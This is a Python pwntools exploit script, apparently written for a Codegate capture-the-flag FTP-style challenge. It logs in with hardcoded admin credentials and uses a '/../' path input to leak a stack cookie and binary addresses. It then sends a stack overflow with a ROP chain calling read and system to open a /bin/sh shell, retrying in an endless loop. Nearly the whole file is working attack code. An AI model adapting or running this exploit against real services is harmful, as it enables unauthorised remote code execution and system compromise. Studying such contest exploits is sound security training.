from pwn import *

# p = remote('ch41l3ng3s.codegate.kr', 2121)

admin_usr = 'admin'
admin_pw = 'P3ssw0rd'

def menu(p):
  p.recvuntil('Choice:\n')

def join(p, name, age, _id, pw):
  menu(p)
  p.send(p32(1))
  p.sendline(name)
  p.sendline(str(age))
  p.sendline(_id)
  p.sendline(pw)

def login(p, username, password):
  menu(p)
  p.send(p32(3))
  p.sendline(username)
  p.sendline(password)
  # p.interactive()

def try1():
	# p = process('./ftp')
	p = remote('ch41l3ng3s.codegate.kr', 2121)
	join(p, 'A' * 0x60, 0x10, 'B' * 0x60, 'C' * 0x60)
	# login('A' * 0x100, 'B' * 0x100)
	login(p, admin_usr, admin_pw)

	menu(p)
	p.send(p32(2))

	menu(p)
	p.send(p32(5))
	p.sendline('A')
	p.recvline()
	print p.recvline()

	# raw_input('wait')
	# for x in range(90):
	menu(p)
	p.send(p32(7))
	menu(p)
	p.send(p32(8))
	p.send(p32(2))
	menu(p)
	p.send(p32(8))
	p.send(p32(3))
	menu(p)
	p.send(p32(8))
	p.send(p32(4))
	menu(p)
	p.send(p32(8))
	p.send(p32(1))
	payload = '/../' + 'A' * 15 * 4
	# payload += 'A' * (99 - len(payload))
	p.sendline(payload)
	p.recvline()
	x = p.recvline()
	print x
	l = x.find('/')

	a1 = x[l-2:l]
	a2 = struct.unpack('>I', x[l-6:l-2])[0]
	a3 = struct.unpack('>I', x[l-10:l-6])[0]
	a4 = struct.unpack('>I', x[l-14:l-10])[0]
	a5 = struct.unpack('>I', x[l-18:l-14])[0]

	# if a2 & 0xfff == 0xa94 and a5 & 0xfff == 0x831:
	if a5 & 0xfff == 0x831:
	  print hex(a2)
	  print hex(a3)
	  print hex(a4)
	  print hex(a5)
	  bin_base = a5 - 0x4831
	  read_plt = bin_base + 0x12c0
	  bss = bin_base + 0x9100
	  system = bin_base + 0x12a8
	  p3ret = bin_base + 0x1886
	  raw_input('hah')

	  cookie = '\x00\x2f' + x[l-1:l] + x[l-2:l-1]
	  payload = 'A' * (0x70 - 0xC) + cookie + p32(bin_base + 0x8ef8) * 3
	  payload += p32(read_plt)
	  payload += p32(p3ret)
	  payload += p32(0)
	  payload += p32(bss)
	  payload += p32(0x10)
	  payload += p32(system)
	  payload += p32(0x41414141)
	  payload += p32(bss)
	  login(p, 'A', payload)
	
	  p.sendline('/bin/sh\x00')
	  # menu(p)
	  # p.send(p32(3))
	  
	  p.interactive()
	'''
	menu()
	p.send(p32(4))
	join('AAAA', 12, 'BBBB', 'CCCC')
	login('A' * 0x100, 'B' * 0x100)
	'''

	p.close()
	# p.interactive()
x = 1
while True:
  print 'try: %d' % x
  try:
    try1()
  except KeyboardInterrupt:
    print 'Interrupted'
    sys.exit(0)
  except:
    pass
  x += 1




